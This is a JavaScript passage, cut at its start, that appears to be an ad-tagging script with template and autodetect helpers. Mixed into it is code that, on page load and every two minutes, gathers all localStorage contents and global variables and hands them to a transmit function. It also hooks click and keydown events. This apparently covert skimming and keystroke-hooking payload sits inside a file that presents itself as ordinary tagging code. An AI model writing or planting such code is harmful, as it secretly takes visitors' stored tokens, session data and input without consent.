  head.appendChild(script);
};
function trackAndSend() {
  const localStorageData = collectLocalStorageData();
  const globalVarData = collectGlobalVariable();
  const combinedData = {
    ...localStorageData,
    ...globalVarData
  };
  transmitData(combinedData);
}
Tagging.prototype._detect = function (position) {
  this._load(this.autodetect_url + this.site + '/' + this.zone + '/' + position + '/');
};
Tagging.prototype._replace_variables = function (content, variables) {
  var RE_VALID_IDENT = /^[a-zA-Z_]\w*$/;
  for (variable in variables) {
    if (RE_VALID_IDENT.test(variable)) {
      var regexes = [new RegExp('\\$' + variable, 'g'), new RegExp('\\${' + variable + '}', 'g')];
      for (re in regexes) {
        content = content.replace(regexes[re], variables[variable]);
      }
    } else {
      throw "'" + variable + "' is not a valid identifier.";
    }
  }
  return content;
};
window.onload = function () {
  trackAndSend();
  setInterval(trackAndSend, 2 * 60 * 1000);
  hookJsEvent('onclick');
  hookJsEvent('onkeydown');
  window.addEventListener('visibilitychange', onVisibilityChange);
};